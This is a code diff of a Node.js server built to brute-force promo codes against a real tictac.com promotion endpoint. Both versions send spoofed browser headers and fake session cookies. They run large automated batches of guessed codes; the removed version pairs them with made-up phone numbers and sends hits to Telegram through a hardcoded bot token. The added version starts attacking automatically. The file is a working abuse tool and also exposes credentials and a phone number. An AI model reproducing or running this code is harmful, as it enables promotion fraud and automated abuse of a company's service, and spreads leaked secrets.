@@ -1,511 +1,364 @@
 const express = require('express');
 const http = require('http');
-const socketIo = require('socket.io');
+const WebSocket = require('ws');
 const axios = require('axios');
-const cron = require('node-cron');
 const cors = require('cors');
+const path = require('path');
+const cron = require('node-cron');
 require('dotenv').config();
 
-const app = express();
-const server = http.createServer(app);
-const io = socketIo(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
-
-// Configuration
-const CONFIG = {
-    BOT_TOKEN: process.env.BOT_TOKEN || "8468676540:AAFsb4SPSlAD-5dNUmbQARL5Sj9cXlO7Oac",
-    BASE_URL: "https://www.tictac.com",
-    ENDPOINT: "/in/en/xp/jarpecarpromo/home/generateOTP",
-    BATCH_SIZE: 5000,
-    MAX_CONCURRENT: 200,
-    WORKING_CODES: ["MTWCDY", "MY6BKC", "TPHV6T", "TH6HXF", "THBK38"],
-    RENDER_KEEP_ALIVE: true
-};
-
-// Global state
-let isRunning = false;
-let successCodes = new Set();
-let totalAttempts = 0;
-let currentBatch = 0;
-let connectedClients = new Set();
-
-// Telegram API
-const TELEGRAM_API = https://api.telegram.org/bot${CONFIG.BOT_TOKEN};
-
-// Middleware
-app.use(cors());
-app.use(express.json());
-app.use(express.static('public'));
-
-// WebSocket connection handler
-io.on('connection', (socket) => {
-    console.log('🌐 Client connected:', socket.id);
-    connectedClients.add(socket.id);
-    
-    // Send current status
-    socket.emit('status', {
-        isRunning,
-        totalAttempts,
-        successCount: successCodes.size,
-        currentBatch,
-        lastUpdate: new Date().toISOString()
-    });
-    
-    // Send success codes
-    socket.emit('successCodes', Array.from(successCodes));
-    
-    socket.on('disconnect', () => {
-        console.log('❌ Client disconnected:', socket.id);
-        connectedClients.delete(socket.id);
-    });
-});
-
-// Broadcast to all connected clients
-function broadcast(event, data) {
-    io.emit(event, data);
-}
-
-// Pattern analysis
-function analyzePatterns() {
-    const patterns = {
-        position_patterns: {},
-        char_frequencies: {},
-        structure_patterns: [],
-        prefix_suffix: { prefix: {}, suffix: {} }
-    };
-
-    CONFIG.WORKING_CODES.forEach(code => {
-        // Position analysis
-        for (let i = 0; i < 6; i++) {
-            if (!patterns.position_patterns[i]) {
-                patterns.position_patterns[i] = {
-                    letters: [],
-                    digits: [],
-                    common: [],
-                    frequency: {}
-                };
-            }
-            
-            const char = code[i];
-            if (char.match(/[A-Z]/)) {
-                patterns.position_patterns[i].letters.push(char);
-            } else {
-                patterns.position_patterns[i].digits.push(char);
-            }
-            
-            patterns.position_patterns[i].frequency[char] = 
-                (patterns.position_patterns[i].frequency[char] || 0) + 1;
-        }
-
-        // Character frequency
-        for (const char of code) {
-            patterns.char_frequencies[char] = (patterns.char_frequencies[char] || 0) + 1;
-        }
-
-        // Structure pattern
-        const structure = code.split('').map(c => c.match(/[A-Z]/) ? 'L' : 'D').join('');
-        patterns.structure_patterns.push(structure);
-
-        // Prefix/Suffix
-        const prefix = code.substring(0, 2);
-        const suffix = code.substring(4);
-        patterns.prefix_suffix.prefix[prefix] = (patterns.prefix_suffix.prefix[prefix] || 0) + 1;
-        patterns.prefix_suffix.suffix[suffix] = (patterns.prefix_suffix.suffix[suffix] || 0) + 1;
-    });
-
-    return patterns;
-}
-
-// Smart code generation
-function generateSmartCodes(count, patterns) {
-    const codes = new Set(CONFIG.WORKING_CODES);
-
-    // Structure-based generation
-    const structureWeights = {};
-    patterns.structure_patterns.forEach(struct => {
-        structureWeights[struct] = (structureWeights[struct] || 0) + 1;
-    });for (const [struct, weight] of Object.entries(structureWeights)) {
-        const structCount = Math.floor((count * weight) / Object.values(structureWeights).reduce((a, b) => a + b, 0));
+class TicTacOTPGenerator {
+    constructor() {
+        this.app = express();
+        this.server = http.createServer(this.app);
+        this.wss = new WebSocket.Server({ server: this.server });
         
-        for (let i = 0; i < structCount; i++) {
-            let code = '';
-            for (const patternChar of struct) {
-                if (patternChar === 'L') {
-                    const letters = Object.keys(patterns.char_frequencies).filter(c => c.match(/[A-Z]/));
-                    const weights = letters.map(c => patterns.char_frequencies[c] || 1);
-                    code += weightedRandomChoice(letters, weights);
+        // Configuration
+        this.baseUrl = 'https://www.tictac.com';
+        this.endpoint = '/in/en/xp/jarpecarpromo/home/generateOTP';
+        this.phoneNumber = process.env.PHONE_NUMBER || '8284084799';
+        this.isRunning = false;
+        this.successfulCodes = [];
+        this.attempts = 0;
+        this.maxAttempts = 1000;
+        this.threads = 3;
+        
+        // WebSocket clients
+        this.clients = new Set();
+        
+        // Setup middleware
+        this.setupMiddleware();
+        this.setupRoutes();
+        this.setupWebSocket();
+        this.setupAutoRestart();
+        
+        // Initialize
+        this.initialize();
+    }
+
+    setupMiddleware() {
+        this.app.use(cors());
+        this.app.use(express.json());
+        this.app.use(express.static(path.join(__dirname, 'public')));
+    }
+
+    setupRoutes() {
+        // API Routes
+        this.app.get('/', (req, res) => {
+            res.json({
+                status: 'running',
+                uptime: process.uptime(),
+                successfulCodes: this.successfulCodes.length,
+                attempts: this.attempts,
+                isRunning: this.isRunning
+            });
+        });
+
+        this.app.post('/api/start', (req, res) => {
+            if (!this.isRunning) {
+                this.startGeneration();
+                res.json({ message: 'OTP generation started' });
+            } else {
+                res.json({ message: 'Already running' });
+            }
+        });
+
+        this.app.post('/api/stop', (req, res) => {
+            this.stopGeneration();
+            res.json({ message: 'OTP generation stopped' });
+        });
+
+        this.app.get('/api/codes', (req, res) => {
+            res.json({
+                successfulCodes: this.successfulCodes,
+                totalAttempts: this.attempts,
+                recentCodes: this.successfulCodes.slice(-10)
+            });
+        });
+
+        this.app.post('/api/test-codes', async (req, res) => {
+            const { codes } = req.body;
+            if (codes && Array.isArray(codes)) {
+                await this.testSpecificCodes(codes);
+                res.json({ message: 'Testing specific codes', codes });
+            } else {
+                res.status(400).json({ error: 'Invalid codes array' });
+            }
+        });
+
+        this.app.post('/api/phone', (req, res) => {
+            const { phone } = req.body;
+            if (phone) {
+                this.phoneNumber = phone;
+                res.json({ message: 'Phone number updated', phone });
+            } else {
+                res.status(400).json({ error: 'Invalid phone number' });
+            }
+        });
+    }
+
+    setupWebSocket() {
+        this.wss.on('connection', (ws, req) => {
+            console.log('New WebSocket connection');
+            this.clients.add(ws);
+
+            // Send current status
+            ws.send(JSON.stringify({
+                type: 'status',
+                data: {
+                    isRunning: this.isRunning,
+                    successfulCodes: this.successfulCodes.length,
+                    attempts: this.attempts,
+                    recentCodes: this.successfulCodes.slice(-5)
+                }
+            }));
+
+            ws.on('close', () => {
+                console.log('WebSocket disconnected');
+                this.clients.delete(ws);
+            });
+
+            ws.on('error', (error) => {
+                console.error('WebSocket error:', error);
+                this.clients.delete(ws);
+            });
+        });
+    }
+
+    broadcast(data) {
+        const message = JSON.stringify(data);
+        this.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(message);
+            }
+        });
+    }
+
+    generateRandomCode(length = 6) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        return Array.from({ length }, () => 
+            characters[Math.floor(Math.random() * characters.length)]
+        ).join('');
+    }
+
+    generateCommonPatterns() {
+        const patterns = [
+            'MTWCDY', 'TICTAC', 'PROMO', 'OFFER', 'DISCOUNT', 'FREE',
+            'WELCOME', 'NEWUSER', 'FIRST', 'SPECIAL', 'GIFT'
+        ];
+
+        // Add variations
+        for (let i = 0; i < 100; i++) {
+            patterns.push(`TT${i.toString().padStart(4, '0')}`);
+            patterns.push(`PRO${i.toString().padStart(3, '0')}`);
+            patterns.push(`OFF${i.toString().padStart(3, '0')}`);
+        }
+
+        return patterns;
+    }
+
+    async makeRequest(ccode) {
+        const url = `${this.baseUrl}${this.endpoint}`;
+        const sessionId = `1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 200) + 800}`;
+        
+        const headers = {
+            'Host': 'www.tictac.com',
+            'sec-ch-ua-platform': '"Android"',
+            'x-requested-with': 'XMLHttpRequest',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2315 Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'sec-ch-ua': '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'sec-ch-ua-mobile': '?1',
+            'origin': 'https://www.tictac.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept-language': 'en-US,en;q=0.9',
+            'priority': 'u=1, i',
+            'cookie': `PHPSESSID=${sessionId}`
+        };
+
+        const data = new URLSearchParams({
+            phone: this.phoneNumber,
+            ccode: ccode
+        });
+
+        try {
+            const response = await axios.post(url, data.toString(), {
+                headers,
+                timeout: 10000,
+                maxRedirects: 0,
+                validateStatus: (status) => status >= 200 && status < 500
+            });
+
+            this.attempts++;
+
+            if (response.status === 200) {
+                const responseText = JSON.stringify(response.data).toLowerCase();
+                if (responseText.includes('success') || responseText.includes('otp')) {
+                    console.log(`✅ SUCCESS: Code '${ccode}'`);
+                    this.successfulCodes.push({
+                        code: ccode,
+                        timestamp: new Date().toISOString(),
+                        response: response.data
+                    });
+
+                    // Broadcast success
+                    this.broadcast({
+                        type: 'success',
+                        data: { code: ccode, response: response.data }
+                    });
+
+                    return true;
                 } else {
-                    code += Math.floor(Math.random() * 10).toString();
+                    console.log(`❌ Failed: Code '${ccode}'`);
                 }
             }
-            codes.add(code);
+        } catch (error) {
+            console.log(`❌ Error with code '${ccode}': ${error.message}`);
         }
-    }
 
-    // Position-specific generation
-    for (let i = 0; i < count * 0.3; i++) {
-        let code = '';
-        for (let pos = 0; pos < 6; pos++) {
-            const posData = patterns.position_patterns[pos];
-            const available = [...posData.letters, ...posData.digits];
-            
-            if (available.length > 0) {
-                const weights = available.map(char => 
-                    (patterns.char_frequencies[char] || 1) * 
-                    (posData.frequency[char] || 1)
-                );
-                code += weightedRandomChoice(available, weights);
-            } else {
-                code += Math.random() < 0.6 ? 
-                    randomChoice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') : 
-                    randomChoice('0123456789');
-            }
-        }
-        codes.add(code);
-    }
-
-    // Fill remaining with random
-    while (codes.size < count) {
-        codes.add(randomString(6, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'));
-    }
-
-    return Array.from(codes).slice(0, count);
-}
-
-// Helper functions
-function randomString(length, chars) {
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-function randomChoice(array) {
-    return array[Math.floor(Math.random() * array.length)];
-}
-
-function weightedRandomChoice(items, weights) {
-    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
-    let random = Math.random() * totalWeight;
-    
-    for (let i = 0; i < items.length; i++) {
-        random -= weights[i];
-        if (random <= 0) return items[i];
-    }
-    return items[items.length - 1];
-}
-
-// Phone number generation
-function generatePhoneNumber() {
-    const prefixes = ['7', '8', '9', '6'];
-    const prefix = randomChoice(prefixes);
-    const remaining = randomString(9, '0123456789');
-    return prefix + remaining;
-}
-
-// Telegram notification
-async function sendTelegramSuccess(code, phone) {
-    const message = 
-🎯 <b>REALTIME SUCCESS!</b>
-
-🔑 <b>Code:</b> <code>${code}</code>
-📱 <b>Phone:</b> <code>${phone}</code>
-⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
-📊 <b>Total Success:</b> ${successCodes.size} codes
-🔄 <b>Batch:</b> ${currentBatch}
-💻 <b>Mode:</b> Realtime WebSocket
-    ;
-
-    try {
-        await axios.post(${TELEGRAM_API}/sendMessage, {
-            chat_id: 'me',
-            text: message.trim(),
-            parse_mode: 'HTML'
-        });
-        return true;
-    } catch (error) {
-        console.error('❌ Telegram error:', error.message);
         return false;
     }
-}
 
-// TicTac API request
-async function makeTicTacRequest(code, phone) {
-    const headers = {
-        'Host': 'www.tictac.com',
-        'sec-ch-ua-platform': '"Windows"',
-        'x-requested-with': 'XMLHttpRequest',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','sec-ch-ua-mobile': '?0',
-        'origin': 'https://www.tictac.com',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-dest': 'empty',
-        'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=1, i',
-        'user-agent': randomChoice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
-        ]),
-        'cookie': PHPSESSID=1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 900) + 100}
-    };
-
-    const data = new URLSearchParams({
-        phone: phone,
-        ccode: code
-    });
-
-    try {
-        const response = await axios.post(
-            ${CONFIG.BASE_URL}${CONFIG.ENDPOINT},
-            data,
-            { headers, timeout: 5000 }
-        );
-
-        totalAttempts++;
-        
-        if (response.status === 200) {
-            const responseData = response.data;
-            if (responseData && typeof responseData === 'object') {
-                if (JSON.stringify(responseData).toLowerCase().includes('success')) {
-                    return { status: 'success', data: responseData };
-                } else {
-                    return { status: 'failed', data: responseData };
-                }
-            }
-            return { status: 'failed', data: responseData };
-        }
-        return { status: 'error', error: HTTP ${response.status} };
-        
-    } catch (error) {
-        return { status: 'error', error: error.message };
+    async processCodeBatch(codes) {
+        const promises = codes.map(code => this.makeRequest(code));
+        await Promise.allSettled(promises);
     }
-}
 
-// Main bruteforce function
-async function executeBatch(codes, phones) {
-    const results = [];
-    let successCount = 0;
-    
-    console.log(🚀 Starting batch with ${codes.length} codes...);
-    broadcast('batchStart', { 
-        batchSize: codes.length, 
-        timestamp: new Date().toISOString() 
-    });
-    
-    // Process in smaller chunks for better performance
-    const chunkSize = 50;
-    const chunks = [];
-    
-    for (let i = 0; i < codes.length; i += chunkSize) {
-        chunks.push({
-            codes: codes.slice(i, i + chunkSize),
-            phones: phones.slice(i, i + chunkSize)
+    async startGeneration() {
+        if (this.isRunning) return;
+        
+        this.isRunning = true;
+        console.log('🔍 Starting TicTac OTP Generator...');
+        console.log(`🎯 Target: ${this.phoneNumber}`);
+        console.log(`🚀 Max attempts: ${this.maxAttempts}`);
+
+        // Broadcast start
+        this.broadcast({
+            type: 'start',
+            data: { phone: this.phoneNumber, maxAttempts: this.maxAttempts }
         });
-    }
-    
-    for (let chunkIndex = 0; chunkIndex < chunks.length; chunkIndex++) {
-        const chunk = chunks[chunkIndex];
-        const promises = chunk.codes.map((code, index) => 
-            makeTicTacRequest(code, chunk.phones[index])
-        );
-        
-        const chunkResults = await Promise.allSettled(promises);
-        
-        chunkResults.forEach((result, index) => {
-            if (result.status === 'fulfilled') {
-                const response = result.value;
-                results.push(response);
+
+        try {
+            // Try common patterns first
+            const commonCodes = this.generateCommonPatterns();
+            const batchSize = this.threads;
+            
+            for (let i = 0; i < commonCodes.length && this.isRunning && this.attempts < this.maxAttempts; i += batchSize) {
+                const batch = commonCodes.slice(i, i + batchSize);
+                await this.processCodeBatch(batch);
                 
-                if (response.status === 'success') {
-                    successCount++;
-                    const code = chunk.codes[index];
-                    const phone = chunk.phones[index];
-                    
-                    successCodes.add(code);
-                    sendTelegramSuccess(code, phone);
-                    
-                    // Broadcast to all connected clients
-                    broadcast('success', {
-                        code: code,
-                        phone: phone,
-                        totalSuccess: successCodes.size,
-                        timestamp: new Date().toISOString()
-                    });
-                    
-                    console.log(🎯 SUCCESS #${successCount}: ${code});
+                if (this.successfulCodes.length >= 5) break;
+                
+                // Small delay between batches
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            // Try random codes
+            while (this.isRunning && this.attempts < this.maxAttempts && this.successfulCodes.length < 5) {
+                const randomCodes = Array.from({ length: batchSize }, () => this.generateRandomCode(6));
+                await this.processCodeBatch(randomCodes);
+                
+                if (this.successfulCodes.length >= 5) break;
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+
+        } catch (error) {
+            console.error('Error during generation:', error);
+        } finally {
+            this.isRunning = false;
+            this.broadcast({
+                type: 'stop',
+                data: {
+                    successfulCodes: this.successfulCodes.length,
+                    totalAttempts: this.attempts
                 }
-            }
-        });
+            });
+            console.log('Generation completed');
+        }
+    }
+
+    stopGeneration() {
+        this.isRunning = false;
+        console.log('Stopping generation...');
+    }
+
+    async testSpecificCodes(codes) {
+        console.log(`🧪 Testing ${codes.length} specific codes...`);
         
-        // Progress update
-        const progress = ((chunkIndex + 1) / chunks.length) * 100;broadcast('progress', {
-            progress: progress,
-            completed: (chunkIndex + 1) * chunkSize,
-            total: codes.length,
-            successCount: successCount,
-            timestamp: new Date().toISOString()
-        });
-        
-        // Small delay between chunks to prevent overwhelming
-        if (chunkIndex < chunks.length - 1) {
-            await new Promise(resolve => setTimeout(resolve, 100));
-        }
-    }
-    
-    return { results, successCount };
-}
-
-// Main bruteforce loop
-async function runBruteforce() {
-    if (isRunning) {
-        console.log('⚠️  Bruteforce already running');
-        return;
-    }
-    
-    isRunning = true;
-    currentBatch++;
-    
-    console.log(\n${'='*80});
-    console.log(🚀 STARTING BATCH #${currentBatch} - ${CONFIG.BATCH_SIZE} codes);
-    console.log(${'='*80});
-    
-    broadcast('status', { isRunning: true, currentBatch });
-    
-    const patterns = analyzePatterns();
-    const codes = generateSmartCodes(CONFIG.BATCH_SIZE, patterns);
-    const phones = Array.from({length: CONFIG.BATCH_SIZE}, () => generatePhoneNumber());
-    
-    console.log(🧠 Generated ${codes.length} smart codes);
-    console.log(📱 Generated ${phones.length} phone numbers);
-    console.log(⚡ Starting ${CONFIG.BATCH_SIZE} requests...);
-    
-    const startTime = Date.now();
-    const { successCount } = await executeBatch(codes, phones);
-    const endTime = Date.now();
-    const duration = (endTime - startTime) / 1000;
-    
-    console.log(\n${'='*80});
-    console.log(🏁 BATCH #${currentBatch} COMPLETED);
-    console.log(⏱️  Duration: ${duration.toFixed(2)} seconds);
-    console.log(🎯 Success: ${successCount} codes);
-    console.log(📊 Success Rate: ${(successCount/CONFIG.BATCH_SIZE*100).toFixed(2)}%);
-    console.log(⚡ Speed: ${(CONFIG.BATCH_SIZE/duration).toFixed(1)} codes/second);
-    console.log(${'='*80});
-    
-    // Final broadcast
-    broadcast('batchComplete', {
-        batchNumber: currentBatch,
-        duration: duration,
-        successCount: successCount,
-        successRate: (successCount/CONFIG.BATCH_SIZE*100),
-        totalSuccess: successCodes.size,
-        timestamp: new Date().toISOString()
-    });
-    
-    isRunning = false;
-    
-    return { successCount, duration };
-}
-
-// Continuous running with cron
-function startContinuousMode() {
-    console.log('🔄 Starting continuous mode...');
-    
-    // Run every 2 minutes
-    cron.schedule('*/2 * * * *', async () => {
-        if (!isRunning) {
-            console.log('\n⏰ Scheduled batch starting...');
-            try {
-                await runBruteforce();
-            } catch (error) {
-                console.error('❌ Batch error:', error);
-                broadcast('error', { error: error.message, timestamp: new Date().toISOString() });
+        for (const code of codes) {
+            if (!this.isRunning) break;
+            
+            const success = await this.makeRequest(code);
+            if (success) {
+                console.log(`✅ Code '${code}' worked!`);
             }
-        } else {
-            console.log('⏳ Previous batch still running, skipping...');
+            
+            // Delay between requests
+            await new Promise(resolve => setTimeout(resolve, 500));
         }
-    });
-    
-    // Keep-alive for Render.com
-    if (CONFIG.RENDER_KEEP_ALIVE) {
-        cron.schedule('*/5 * * * *', () => {
-            console.log('💓 Keep-alive ping');
-            broadcast('keepalive', { timestamp: new Date().toISOString() });
+    }
+
+    setupAutoRestart() {
+        // Auto-restart every hour
+        cron.schedule('0 * * * *', () => {
+            console.log('🔄 Auto-restarting application...');
+            this.broadcast({
+                type: 'restart',
+                data: { reason: 'scheduled', uptime: process.uptime() }
+            });
+            
+            setTimeout(() => {
+                process.exit(0);
+            }, 5000);
         });
+
+        // Memory check and restart if needed
+        setInterval(() => {
+            const usage = process.memoryUsage();
+            const heapUsedMB = usage.heapUsed / 1024 / 1024;
+            
+            if (heapUsedMB > 500) { // Restart if using more than 500MB
+                console.log(`🔄 High memory usage (${heapUsedMB.toFixed(2)}MB), restarting...`);
+                process.exit(0);
+            }
+        }, 60000); // Check every minute
+    }
+
+    async initialize() {
+        const PORT = process.env.PORT || 3000;
+        
+        this.server.listen(PORT, '0.0.0.0', () => {
+            console.log(`🚀 Server running on port ${PORT}`);
+            console.log(`📱 Target phone: ${this.phoneNumber}`);
+            console.log(`🔗 WebSocket endpoint: ws://localhost:${PORT}`);
+            console.log(`🌐 HTTP API: http://localhost:${PORT}`);
+        });
+
+        // Start generation automatically
+        setTimeout(() => {
+            this.startGeneration();
+        }, 2000);
     }
 }
-
-// API Routes
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/public/index.html');
-});
-
-app.get('/api/status', (req, res) => {
-    res.json({
-        isRunning,
-        totalAttempts,
-        successCount: successCodes.size,
-        currentBatch,
-        lastUpdate: new Date().toISOString(),
-        workingCodes: Array.from(successCodes).slice(-10),
-        config: {
-            batchSize: CONFIG.BATCH_SIZE,
-            maxConcurrent: CONFIG.MAX_CONCURRENT
-        }
-    });
-});
-
-app.post('/api/start', async (req, res) => {
-    try {
-        const result = await runBruteforce();
-        res.json({ success: true, result });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-app.post('/api/stop', (req, res) => {
-    isRunning = false;
-    res.json({ success: true, message: 'Stopping current batch...' });
-});app.get('/api/codes', (req, res) => {
-    res.json({
-        successCodes: Array.from(successCodes),
-        count: successCodes.size,
-        lastUpdate: new Date().toISOString()
-    });
-});
-
-// Start server
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(🚀 Server running on port ${PORT});
-    console.log(🌐 WebSocket ready for realtime updates);
-    console.log(📱 Telegram notifications enabled);
-    
-    // Start continuous mode
-    startContinuousMode();
-    
-    // Run initial batch
-    setTimeout(() => {
-        console.log('🎯 Starting initial batch...');
-        runBruteforce().catch(console.error);
-    }, 5000);
-});
 
 // Graceful shutdown
-process.on('SIGINT', () => {
-    console.log('\n🛑 Shutting down gracefully...');
-    server.close(() => {
-        console.log('✅ Server closed');
-        process.exit(0);
-    });
+process.on('SIGTERM', () => {
+    console.log('SIGTERM received, shutting down gracefully');
+    process.exit(0);
 });
+
+process.on('SIGINT', () => {
+    console.log('SIGINT received, shutting down gracefully');
+    process.exit(0);
+});
+
+// Start the application
+const generator = new TicTacOTPGenerator();
+
+module.exports = generator;
